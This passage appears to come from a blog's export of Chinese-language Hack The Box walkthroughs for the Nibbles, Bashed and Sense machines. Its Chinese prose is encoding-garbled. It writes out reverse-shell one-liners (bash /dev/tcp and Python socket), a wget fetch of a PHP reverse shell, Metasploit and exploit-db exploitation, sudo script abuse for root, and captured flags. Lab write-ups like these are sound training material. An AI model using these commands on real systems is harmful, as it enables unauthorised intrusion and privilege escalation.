12:58:31 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 301) [Size: 321] [--&gt; http://10.10.10.75/nibbleblog/admin/] /plugins (Status: 301) [Size: 323] [--&gt; http://10.10.10.75/nibbleblog/plugins/] /themes (Status: 301) [Size: 322] [--&gt; http://10.10.10.75/nibbleblog/themes/] /README (Status: 200) [Size: 4628] /languages (Status: 301) [Size: 325] [--&gt; http://10.10.10.75/nibbleblog/languages/] /content (Status: 301) [Size: 323] [--&gt; http://10.10.10.75/nibbleblog/content/] =============================================================== 2022/04/08 13:02:12 Finished =============================================================== è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª README æ–‡ä»¶ é€šè¿‡ README æ–‡ä»¶ï¼Œé¦–å…ˆæˆ‘ä»¬çŸ¥é“äº†nibbleblog ä½¿ç”¨çš„ç‰ˆæœ¬ä¸º 4.0.3 â”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel] â””â”€# curl http://10.10.10.75/nibbleblog/content/private/users.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; &lt;users&gt;&lt;user username=&quot;admin&quot;&gt;&lt;id type=&quot;integer&quot;&gt;0&lt;/id&gt;&lt;session_fail_count type=&quot;integer&quot;&gt;0&lt;/session_fail_count&gt;&lt;session_date type=&quot;integer&quot;&gt;1514544131&lt;/session_date&gt;&lt;/user&gt;&lt;blacklist type=&quot;string&quot; ip=&quot;10.10.10.1&quot;&gt;&lt;date type=&quot;integer&quot;&gt;1512964659&lt;/date&gt;&lt;fail_count type=&quot;integer&quot;&gt;1&lt;/fail_count&gt;&lt;/blacklist&gt;&lt;/users&gt; &lt;users&gt; &lt;user username=&quot;admin&quot;&gt; &lt;id type=&quot;integer&quot;&gt;0&lt;/id&gt; &lt;session_fail_count type=&quot;integer&quot;&gt;0&lt;/session_fail_count&gt; &lt;session_date type=&quot;integer&quot;&gt;1514544131&lt;/session_date&gt; &lt;/user&gt; &lt;blacklist type=&quot;string&quot; ip=&quot;10.10.10.1&quot;&gt; &lt;date type=&quot;integer&quot;&gt;1512964659&lt;/date&gt; &lt;fail_count type=&quot;integer&quot;&gt;1&lt;/fail_count&gt; &lt;/blacklist&gt; &lt;/users&gt; æˆ‘ä»¬åœ¨ users.xml ä¸­çŸ¥é“äº†ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œ IP åœ°å€ http://10.10.10.75/nibbleblog/admin.php å¹¶ä¸”æ‰¾åˆ°äº†ä¸€ä¸ªç™»å½•ç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰å¯†ç ï¼ŒNibbleblog ä¹Ÿæ²¡æœ‰é»˜è®¤å¯†ç ï¼Œæˆ‘ä»¬å»å°è¯•ä¸€ä¸‹ç™»å½• æœ€åæµ‹è¯•å¼±å£ä»¤æˆåŠŸç™»å½• username = admin password = nibbles æˆ‘ä»¬å»æœç´¢ä¸€ä¸‹æ¼æ´ Searchsploitâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Nibbles] â””â”€# searchsploit Nibbleblog 4.0.3 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results çŸ¥é“äº† msf æœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ æ¼æ´åˆ©ç”¨msf6 exploit(multi/http/nibbleblog_file_upload) &gt; show options Module options (exploit/multi/http/nibbleblog_file_upload): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD nibbles yes The password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.75 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /nibbleblog/ yes The base path to the web application USERNAME admin yes The username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.9 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Nibbleblog 4.0.3 è®¾ç½®å¥½ç›¸å…³çš„å‚æ•°ï¼Œç„¶å exploit æ‰§è¡Œ msf6 exploit(multi/http/nibbleblog_file_upload) &gt; exploit [*] Started reverse TCP handler on 10.10.14.9:4444 [*] Sending stage (39282 bytes) to 10.10.10.75 [+] Deleted image.php [*] Meterpreter session 1 opened (10.10.14.9:4444 -&gt; 10.10.10.75:41138) at 2022-04-08 13:24:32 +0800 meterpreter &gt; getuid Server username: nibbler (1001) æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; æŒ‰ç…§è¿™äº›æµç¨‹è·å–ä¸€ä¸ªäº¤äº’å¼ shell nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/user.txt e8c44981255d5ccfaba9f1e2c343b6a1 æˆåŠŸè·å¾— user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡nibbler@Nibbles:/home/nibbler$ sudo -l Matching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh ä½¿ç”¨ sudo -l å‘ç°ä¸€ä¸ª sh è„šæœ¬å¯ä»¥ç”¨ root æƒé™æ‰§è¡Œ nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory æŸ¥çœ‹æ˜¾ç¤ºæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œå»æµè§ˆä¸€ä¸‹ nibbler@Nibbles:/home/nibbler$ ls -la total 20 drwxr-xr-x 3 nibbler nibbler 4096 Dec 29 2017 . drwxr-xr-x 3 root root 4096 Dec 10 2017 .. -rw------- 1 nibbler nibbler 0 Dec 29 2017 .bash_history drwxrwxr-x 2 nibbler nibbler 4096 Dec 10 2017 .nano -r-------- 1 nibbler nibbler 1855 Dec 10 2017 personal.zip -r-------- 1 nibbler nibbler 33 Apr 8 01:20 user.txt æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå»è‡ªå·±è§£å‹å‡ºæ¥ nibbler@Nibbles:/home/nibbler$ unzip personal.zip Archive: personal.zip creating: personal/ creating: personal/stuff/ inflating: personal/stuff/monitor.sh ç„¶åå†å»æŸ¥çœ‹ä¸€ä¸‹ nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh #################################################################################################### # Tecmint_monitor.sh # # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/ # # If any bug, report us in the link below # # Free to use/edit/distribute the code below by # # giving proper credit to Tecmint.com and Author # # # #################################################################################################### #! /bin/bash # unset any variable which system may be using # clear the screen clear unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage while getopts iv name do case $name in i)iopt=1;; v)vopt=1;; *)echo &quot;Invalid arg&quot;;; esac done if [[ ! -z $iopt ]] then { wd=$(pwd) basename &quot;$(test -L &quot;$0&quot; &amp;&amp; readlink &quot;$0&quot; || echo &quot;$0&quot;)&quot; &gt; /tmp/scriptname scriptname=$(echo -e -n $wd/ &amp;&amp; cat /tmp/scriptname) su -c &quot;cp $scriptname /usr/bin/monitor&quot; root &amp;&amp; echo &quot;Congratulations! Script Installed, now run monitor Command&quot; || echo &quot;Installation failed&quot; } fi if [[ ! -z $vopt ]] then { echo -e &quot;tecmint_monitor version 0.1\\nDesigned by Tecmint.com\\nReleased Under Apache 2.0 License&quot; } fi if [[ $# -eq 0 ]] then { # Define Variable tecreset tecreset=$(tput sgr0) # Check if connected to Internet or not ping -c 1 google.com &amp;&gt; /dev/null &amp;&amp; echo -e &#39;\\E[32m&#39;&quot;Internet: $tecreset Connected&quot; || echo -e &#39;\\E[32m&#39;&quot;Internet: $tecreset Disconnected&quot; # Check OS Type os=$(uname -o) echo -e &#39;\\E[32m&#39;&quot;Operating System Type :&quot; $tecreset $os # Check OS Release Version and Name cat /etc/os-release | grep &#39;NAME\\|VERSION&#39; | grep -v &#39;VERSION_ID&#39; | grep -v &#39;PRETTY_NAME&#39; &gt; /tmp/osrelease echo -n -e &#39;\\E[32m&#39;&quot;OS Name :&quot; $tecreset &amp;&amp; cat /tmp/osrelease | grep -v &quot;VERSION&quot; | cut -f2 -d\\&quot; echo -n -e &#39;\\E[32m&#39;&quot;OS Version :&quot; $tecreset &amp;&amp; cat /tmp/osrelease | grep -v &quot;NAME&quot; | cut -f2 -d\\&quot; # Check Architecture architecture=$(uname -m) echo -e &#39;\\E[32m&#39;&quot;Architecture :&quot; $tecreset $architecture # Check Kernel Release kernelrelease=$(uname -r) echo -e &#39;\\E[32m&#39;&quot;Kernel Release :&quot; $tecreset $kernelrelease # Check hostname echo -e &#39;\\E[32m&#39;&quot;Hostname :&quot; $tecreset $HOSTNAME # Check Internal IP internalip=$(hostname -I) echo -e &#39;\\E[32m&#39;&quot;Internal IP :&quot; $tecreset $internalip # Check External IP externalip=$(curl -s ipecho.net/plain;echo) echo -e &#39;\\E[32m&#39;&quot;External IP : $tecreset &quot;$externalip # Check DNS nameservers=$(cat /etc/resolv.conf | sed &#39;1 d&#39; | awk &#39;{print $2}&#39;) echo -e &#39;\\E[32m&#39;&quot;Name Servers :&quot; $tecreset $nameservers # Check Logged In Users who&gt;/tmp/who echo -e &#39;\\E[32m&#39;&quot;Logged In users :&quot; $tecreset &amp;&amp; cat /tmp/who # Check RAM and SWAP Usages free -h | grep -v + &gt; /tmp/ramcache echo -e &#39;\\E[32m&#39;&quot;Ram Usages :&quot; $tecreset cat /tmp/ramcache | grep -v &quot;Swap&quot; echo -e &#39;\\E[32m&#39;&quot;Swap Usages :&quot; $tecreset cat /tmp/ramcache | grep -v &quot;Mem&quot; # Check Disk Usages df -h| grep &#39;Filesystem\\|/dev/sda*&#39; &gt; /tmp/diskusage echo -e &#39;\\E[32m&#39;&quot;Disk Usages :&quot; $tecreset cat /tmp/diskusage # Check Load Average loadaverage=$(top -n 1 -b | grep &quot;load average:&quot; | awk &#39;{print $10 $11 $12}&#39;) echo -e &#39;\\E[32m&#39;&quot;Load Average :&quot; $tecreset $loadaverage # Check System Uptime tecuptime=$(uptime | awk &#39;{print $3,$4}&#39; | cut -f1 -d,) echo -e &#39;\\E[32m&#39;&quot;System Uptime Days/(HH:MM) :&quot; $tecreset $tecuptime # Unset Variables unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage # Remove Temporary Files rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage } fi shift $(($OPTIND -1)) æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„æƒé™ç»„ nibbler@Nibbles:/home/nibbler$ ls -la /home/nibbler/personal/stuff/monitor.sh -rwxrwxrwx 1 nibbler nibbler 4015 May 8 2015 /home/nibbler/personal/stuff/monitor.sh 777 æƒé™ï¼Œé‚£å°±ç®€å•äº†ï¼Œå†™å…¥ä¸€æ®µæŸ¥çœ‹ flag çš„è¯­å¥ç„¶åæ‰§è¡Œ nibbler@Nibbles:/home/nibbler/personal/stuff$ echo &#39;cat /root/root.txt&#39; &gt; monitor.sh nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh 48716e5e4fa73411376fb8ee5f037bed æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶ å¦‚æœæˆ‘ä»¬å‘æ‹¿åˆ° root æƒé™çš„ shellï¼Œé‚£å°±å»å†™å…¥ä¸€ä¸ªåå¼¹è¯­å¥ ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 5555 echo &#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.9/5555 0&gt;&amp;1&quot;&#39; &gt; monitor.sh å†™å…¥è¯­å¥åæ‰§è¡Œ sudo ./ monitor.sh root@Nibbles:/home/nibbler/personal/stuff# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸæ‹¿åˆ° root æƒé™","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Bashed - Hackthebox","slug":"Hackthebox - Bashed","date":"2022-04-08T11:38:36.000Z","updated":"2023-05-20T01:21:30.000Z","comments":true,"path":"2022/04/08/Hackthebox - Bashed/","link":"","permalink":"http://www.lucifiel.com/2022/04/08/Hackthebox%20-%20Bashed/","excerpt":"","text":"Hackthebox - Bashedé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Bashed] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.68 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-07 20:51 EDT Nmap scan report for 10.10.10.68 Host is up (0.27s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel&#39;s Development Site No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/7%OT=80%CT=1%CU=37395%PV=Y%DS=2%DC=T%G=Y%TM=624F8737 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=RD%II=I%TS=A)SEQ OS:(SP=F8%GCD=1%ISR=104%TI=Z%TS=A)SEQ(SP=101%GCD=1%ISR=107%TI=Z%II=I%TS=B)S OS:EQ(SP=F9%GCD=1%ISR=103%TI=Z%CI=RD%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7 OS:%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=7120%W OS:2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NN OS:SNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40 OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 229.69 ms 10.10.14.1 2 229.83 ms 10.10.10.68 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 53.00 seconds Http çœ‹ç€ä¼¼ä¹åƒæ˜¯ä¸€ä¸ªåšå®¢ï¼Œå»éšä¾¿çœ‹çœ‹ è¿™é‡Œæç¤ºä½¿ç”¨äº† Arrexel çš„ phpbashï¼Œç„¶åç»™äº†ä¸€ä¸ªåœ°å€ &#x2F;uploads&#x2F;phpbash.php ä½†æ˜¯è®¿é—®åä¸å­˜åœ¨ï¼Œå»åšä¸ª fuzz å§ Fuzzgobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.68 [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/08 09:01:23 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 311] [--&gt; http://10.10.10.68/images/] /php (Status: 301) [Size: 308] [--&gt; http://10.10.10.68/php/] /css (Status: 301) [Size: 308] [--&gt; http://10.10.10.68/css/] /dev (Status: 301) [Size: 308] [--&gt; http://10.10.10.68/dev/] /js (Status: 301) [Size: 307] [--&gt; http://10.10.10.68/js/] /fonts (Status: 301) [Size: 310] [--&gt; http://10.10.10.68/fonts/] /server-status (Status: 403) [Size: 299] =============================================================== 2022/04/08 09:04:55 Finished =============================================================== åœ¨ dev ä¸‹æ‰¾åˆ°äº†æˆ‘ä»¬è¦çš„ä¸œè¥¿ æ¼æ´åˆ©ç”¨ ç¡®è®¤å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£å°±æ¥åå¼¹ä¸€ä¸ª bashshell å§ ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nlvp 4444 ç„¶åä¸‹è½½ä¸€ä¸ª åå‘çš„ phpshell https://raw.githubusercontent.com/LucifielHack/TTY-Reverse-Shell-PHP/master/revshell.php ç„¶åä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡å™¨ python3 -m http.server 80 ç„¶ååœ¨ phpbash é‡Œä½¿ç”¨ wget è¿›è¡Œä¸‹è½½ www-data@bashed:/var/www/html/uploads# wget http://10.10.14.9/revshell.php --2022-04-07 19:03:56-- http://10.10.14.9/revshell.php Connecting to 10.10.14.9:80... connected. HTTP request sent, awaiting response... 200 OK Length: 4479 (4.4K) [application/octet-stream] Saving to: &#39;revshell.php&#39; 0K .... 100% 443M=0s 2022-04-07 19:03:56 (443 MB/s) - &#39;revshell.php&#39; saved [4479/4479] æ¥ç€è®¿é—®ä¸€ä¸‹ revshell.phpï¼ˆéœ€è¦åœ¨ uploads ç›®å½•ä¸‹ï¼Œå¦åˆ™æ²¡å†™å…¥æƒé™ï¼‰ curl http://10.10.10.68/uploads/revshell.php $ whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) æˆåŠŸè·å¾—ä¸€ä¸ª shell $ cat /home/arrexel/user.txt 2c281f318555dbc1b856957c7147bfc1 æˆåŠŸè·å¾— user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡$ sudo -l Matching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL ä½¿ç”¨ sudo -l æŸ¥çœ‹æƒé™åï¼Œå‘ç°å¯ä»¥ä½¿ç”¨ scriptmanager ç”¨æˆ·çš„æƒé™æŒ‡ä»¤ä»»ä½•å‘½ä»¤ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; Ctrl+Zè¿”å› stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 é¦–å…ˆè·å¾—ä¸€ä¸ªäº¤äº’å¼ bashï¼Œå¹¶ä¸”ä¿®å¤ä¸€ä¸‹ sudo -u scriptmanager bash ç„¶åä½¿ç”¨ sudo -u æ¥ä½¿ç”¨ scriptmanager ç”¨æˆ·æ‰§è¡Œ bash æŒ‡ä»¤ scriptmanager@bashed:/$ whoami whoami scriptmanager æˆåŠŸè¿›å…¥ scriptmanager çš„ bash scriptmanager@bashed:/$ ls ls bin etc lib media proc sbin sys var boot home lib64 mnt root scripts tmp vmlinuz dev initrd.img lost+found opt run srv usr è¿™é‡Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªä¸æ­£å¸¸çš„ scripts ç›®å½•ï¼Œè¿›å»æŸ¥çœ‹ä¸€ä¸‹ scriptmanager@bashed:/scripts$ ls -la ls -la total 16 drwxrwxr-- 2 scriptmanager scriptmanager 4096 Dec 4 2017 . drwxr-xr-x 23 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py -rw-r--r-- 1 root root 12 Apr 7 19:21 test.txt è¿™é‡Œæœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª test.py æˆ‘ä»¬å¯ä»¥è¿è¡Œï¼Œä¸€ä¸ª test.txt æ˜¯ root è´¦æˆ·çš„æ–‡ä»¶ï¼Œå¹¶ä¸” test.txt ä¼¼ä¹æœ€è¿‘åˆšè¢«ä¿®æ”¹è¿‡ scriptmanager@bashed:/scripts$ cat test.txt cat test.txt testing 123! ä¼¼ä¹æ²¡ä»€ä¹ˆå†…å®¹ scriptmanager@bashed:/scripts$ cat test.py cat test.py f = open(&quot;test.txt&quot;, &quot;w&quot;) f.write(&quot;testing 123!&quot;) f.close è¿™ä¸ªè„šæœ¬ä¼šå‘ test.txt å†™å…¥å†…å®¹ï¼Œé‚£å°±å¥½åŠäº†ï¼Œç¯¡æ”¹ä¸€ä¸‹å†…å®¹ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.9&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]); ç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 5555 æ¥ç€ç­‰å¾…ä¸€ä¼šå„¿ â”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel/Desktop] â””â”€# nc -nvlp 5555 130 â¨¯ listening on [any] 5555 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.10.68] 35106 /bin/sh: 0: can&#39;t access tty; job control turned off # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸæ‹¿åˆ° root æƒé™ # cat /root/root.txt cc4f0afe3a1026d402ba10329674a8e2 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Sense - Hackthebox","slug":"Hackthebox - Sense ","date":"2022-04-07T11:38:36.000Z","updated":"2023-05-20T03:08:39.000Z","comments":true,"path":"2022/04/07/Hackthebox - Sense /","link":"","permalink":"http://www.lucifiel.com/2022/04/07/Hackthebox%20-%20Sense%20/","excerpt":"","text":"Hackthebox - Senseé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Sense] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.60 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-07 00:43 EDT Nmap scan report for 10.10.10.60 Host is up (0.30s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/https? | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Not valid before: 2017-10-14T19:21:35 |_Not valid after: 2023-04-06T19:21:35 |_ssl-date: TLS randomness does not represent time Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: specialized|general purpose Running (JUST GUESSING): Comau embedded (92%), FreeBSD 8.X (85%), OpenBSD 4.X (85%) OS CPE: cpe:/o:freebsd:freebsd:8.1 cpe:/o:openbsd:openbsd:4.3 Aggressive OS guesses: Comau C4G robot control unit (92%), FreeBSD 8.1 (85%), OpenBSD 4.3 (85%), OpenBSD 4.0 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 313.22 ms 10.10.14.1 2 313.26 ms 10.10.10.60 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 65.91 seconds Http æ˜¯ä¸€å° pfsenseï¼Œå…·ä½“çš„ç‰ˆæœ¬ä¸æ˜ æµ‹è¯•äº†ä¸€ä¸‹å¼±å£ä»¤ï¼Œæ²¡æœ‰æˆåŠŸ å» fuzz ä¸€ä¸‹ fuzzâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Sense] â””â”€# gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt -t 200 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://10.10.10.60 [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2022/04/07 16:05:38 Starting gobuster in directory enumeration mode =============================================================== /themes (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/themes/] /css (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/css/] /includes (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/includes/] /javascript (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/javascript/] /changelog.txt (Status: 200) [Size: 271] /classes (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/classes/] /widgets (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/widgets/] /tree (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/tree/] /shortcuts (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/shortcuts/] /installer (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/installer/] /wizards (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/wizards/] /csrf (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/csrf/] /system-users.txt (Status: 200) [Size: 106] /filebrowser (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/filebrowser/] /%7Echeckout%7E (Status: 403) [Size: 345] =============================================================== 2022/04/07 16:12:30 Finished =============================================================== è¿™é‡Œçœ‹åˆ°æœ‰ä¸¤ä¸ª txt æ–‡ä»¶ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹ https://10.10.10.60/changelog.txt # Security Changelog ### Issue There was a failure in updating the firewall. Manual patching is therefore required ### Mitigated 2 of 3 vulnerabilities have been patched. ### Timeline The remaining patches will be installed during the next maintenance window https://10.10.10.60/system-users.txt ####Support ticket### Please create the following user username: Rohit password: company defaults ç¬¬ä¸€ä¸ªæ–‡ä»¶è¯´å‘ç°äº†ä¸‰ä¸ªæ¼æ´ï¼Œå·²ç»ä¿®å¤äº†å…¶ä¸­ä¸¤ä¸ªï¼Œé‚£å°±æ˜¯è¿˜æœ‰ä¸€ä¸ª ç¬¬äºŒä¸ªæ–‡ä»¶å‘Šè¯‰æˆ‘ä»¬æœ‰ä¸€ä¸ªè´¦å· Rohitï¼Œå¯†ç æ˜¯ pfsense çš„é»˜è®¤å¯†ç  å»æœç´¢ä¸€ä¸‹é»˜è®¤å¯†ç  å¾—åˆ°äº†ä¸€ä¸ªè´¦æˆ·å¯†ç  username = rohit password = pfsense æ¼æ´åˆ©ç”¨ç°åœ¨å»ç™»å½• ç™»å…¥åå¯ä»¥çœ‹åˆ°ï¼Œå½“å‰ç‰ˆæœ¬æ˜¯ pfsense 2.1.3 å»æŸ¥æ‰¾ä¸€ä¸‹æ˜¯å¦æœ‰æ¼æ´ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Sense] â””â”€# searchsploit pfsense 2.1.3 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- pfSense &lt; 2.1.4 - &#39;status_rrd_graph_img.php&#39; Command Injection | php/webapps/43560.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results è¿˜çœŸæ‰¾åˆ°ä¸€ä¸ª â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Sense] â””â”€# locate php/webapps/43560.py /usr/share/exploitdb/exploits/php/webapps/43560.py â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Sense] â””â”€# cp /usr/share/exploitdb/exploits/php/webapps/43560.py ./exploit.py æŠŠ exploit ç»™å¤åˆ¶è¿‡æ¥ ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... ç„¶åå»æ‰§è¡Œ exploit â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.10.60] 65102 sh: can&#39;t access tty; job control turned off # whoami&amp;&amp;id root uid=0(root) gid=0(wheel) groups=0(wheel) æˆåŠŸæ‹¿åˆ° root æƒé™çš„ shell # cat /home/rohit/user.txt 